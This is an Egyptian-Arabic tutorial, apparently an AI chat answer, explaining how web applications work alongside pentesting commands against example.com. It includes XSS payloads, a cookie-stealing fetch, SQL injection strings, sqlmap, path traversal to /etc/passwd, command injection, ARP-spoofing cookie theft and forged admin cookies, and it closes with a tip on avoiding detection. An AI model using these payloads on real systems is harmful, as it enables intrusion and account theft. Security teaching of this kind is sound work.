تمام، هنشرح **ازاي تطبيقات الويب بتشتغل (How Web Applications Work)** بنفس الطريقة اللي فاتت: شرح مفصل وعملي مع أكواد وأوامر، مع تركيز على اختبار الاختراق (Pentesting)، وبعد كل جزء هخلّص بالعامية المصرية، وفي الآخر هقدم خطوات عملية للاستغلال.

---

### **1. شرح ازاي تطبيقات الويب بتشتغل بالتفصيل:**

#### **أ. المفهوم الأساسي (What Are Web Apps):**
- تطبيقات الويب هي برامج بتشتغل على الإنترنت، بتتفاعل معاها عن طريق المتصفح (زي جوجل درايف أو فيسبوك). بتعتمد على:
  - **العميل (Client):** المتصفح بتاعك.
  - **السيرفر (Server):** اللي بيخزن البيانات ويظبط المنطق.
- بتستخدم HTML، CSS، JavaScript في الواجهة (Front-End)، ولغات زي PHP أو Python في الخلفية (Back-End).

- **مثال عملي:**
  - لما تعمل تسجيل دخول في موقع:
    - المتصفح بيبعت: `POST /login` مع بياناتك.
    - السيرفر بيرد: صفحة أو رسالة نجاح.

- **جانب عملي للبينتست:**
  - جرب تشوف المصدر في المتصفح:
    - كليك يمين > "View Page Source" (شوف الـ HTML/JavaScript).
  - استخدم `curl`:
    - `curl -X POST -d "user=test&pass=123" http://example.com/login` (شوف الرد).

- **خلاصة بالعامية:**
  - "تطبيق الويب زي المحل اللي بتشتري منه أونلاين، إنت بتطلب من الشاشة والسيرفر بيجهز الطلب في المطبخ."

---

#### **ب. مكونات تطبيقات الويب (Components):**
- **Front-End:** اللي بتشوفه (HTML للهيكل، CSS للشكل، JavaScript للتفاعل).
- **Back-End:** المنطق والحسابات (زي PHP، Node.js، بيتواصل مع قاعدة بيانات).
- **Database:** تخزين البيانات (زي MySQL أو MongoDB).
- **Web Server:** بيخدم الطلبات (زي Apache أو Nginx).

- **مثال عملي:**
  - صفحة تسجيل دخول:
    - Front-End: `<form action="/login" method="POST"><input name="user"><input name="pass"></form>`.
    - Back-End (PHP): `if($_POST['user'] == 'admin' && $_POST['pass'] == '123') { echo "Welcome"; }`.
    - Database: `SELECT * FROM users WHERE username='admin' AND password='123'`.

- **جانب عملي للبينتست:**
  - Front-End:
    - جرب حقن JavaScript: `<script>alert('xss')</script>` في حقل الإدخال.
  - Back-End:
    - `curl -d "user=admin' OR 1=1 --&pass=123" http://example.com/login` (SQL Injection).
  - Database:
    - `sqlmap -u http://example.com/login --data "user=admin&pass=123" --dbs` (استخراج قواعد البيانات).
  - Web Server:
    - `nikto -h http://example.com` (كشف ثغرات).

- **خلاصة بالعامية:**
  - "الدنيا مقسمة: اللي قدامك دي الواجهة، واللي ورا دي السيستم، لو عرفت تضرب أي حته فيهم هتوصل لكل حاجة."

---

#### **ج. سير العمل (Workflow):**
1. **العميل بيبعت طلب:** زي كتابة عنوان URL أو ضغط زرار.
2. **السيرفر بيستقبل ويعالج:** بيفهم الطلب ويجيب البيانات من الـ Database.
3. **السيرفر بيرد:** بيبعت صفحة أو JSON للعميل.
4. **العميل بيعرض:** المتصفح بيظهر النتيجة.

- **مثال عملي:**
  - طلب بحث:
    - المتصفح: `GET /search?q=test HTTP/1.1`.
    - السيرفر يعمل Query: `SELECT * FROM items WHERE name LIKE '%test%'`.
    - الرد: `<div>Results: test1, test2</div>`.

- **جانب عملي للبينتست:**
  - جرب تلعب في الـ URL:
    - `curl http://example.com/search?q=test' OR '1'='1` (SQLi).
  - لو فيه JSON:
    - `curl http://example.com/api/items?q=../../etc/passwd` (Path Traversal).
  - مراقبة بـ Burp Suite:
    - اعترض الطلب وحقن `<img src=x onerror=alert(1)>` (XSS).

- **خلاصة بالعامية:**
  - "العملية زي ما تطلب أكلة: إنت بتقول عايز إيه، السيرفر بيروح يجيبهالك، لو لعبت في الطلب ممكن يجيبلك حاجة مش متوقعها."

---

#### **د. التقنيات المستخدمة (Technologies):**
- **HTTP/HTTPS:** للتواصل.
- **APIs:** زي REST أو GraphQL (لتبادل البيانات).
- **AJAX:** JavaScript بيبعت طلبات من غير تحديث الصفحة.
- **Sessions/Cookies:** عشان يفتكرك السيرفر.

- **مثال عملي:**
  - API:
    - `curl -H "Content-Type: application/json" -d '{"id":1}' http://example.com/api/user`.
  - AJAX:
    - `<script>fetch('/api/data').then(res => console.log(res))</script>`.
  - Cookie:
    - `curl -b "session=abc123" http://example.com`.

- **جانب عملي للبينتست:**
  - API:
    - `curl http://example.com/api/user?id=1 UNION SELECT 1,2,3--` (SQLi).
  - AJAX:
    - جرب حقن في الرد: `<script>fetch('/api/steal?data='+document.cookie)</script>` (XSS).
  - Sessions:
    - `curl -b "session=admin" http://example.com/admin` (Session Hijacking).

- **خلاصة بالعامية:**
  - "التقنيات دي زي الأدوات في المطبخ، لو عرفت تستخدمها أو تكسرها، هتطبخ اللي عايزه أو تبهدل اللي قدامك."

---

### **خطوات عملية للاستغلال (Pentesting):**
1. **اكتشف التطبيق:**
   - `whatweb http://example.com` (معرفة التقنيات).
   - `nmap -sV http://example.com` (كشف السيرفر).

2. **اختبر الـ Front-End:**
   - حقن XSS: `<script>alert(document.cookie)</script>` في أي حقل.
   - استخدم Burp Suite لتعديل الطلبات.

3. **هاجم الـ Back-End:**
   - `sqlmap -u http://example.com/search?q=test --dbs` (SQLi).
   - `curl http://example.com/admin/../config.php` (Path Traversal).

4. **استغل الـ APIs:**
   - `curl -X GET http://example.com/api/users/1' OR '1'='1` (SQLi).
   - جرب معلمات غريبة: `?id=1;whoami` (Command Injection).

5. **العب في الـ Sessions:**
   - سرقة كوكيز بـ MITM: `arpspoof` مع `tcpdump`.
   - تعديل كوكيز: `curl -b "role=admin" http://example.com`.

---

### **خلاصة نهائية بالعامية:**
- "تطبيقات الويب زي لعبة شطرنج، لو فهمت ازاي القطع بتتحرك بين الواجهة والسيرفر، هتعرف تهجم وتكسب، بس خلّيك دماغ عشان متتكشفش!"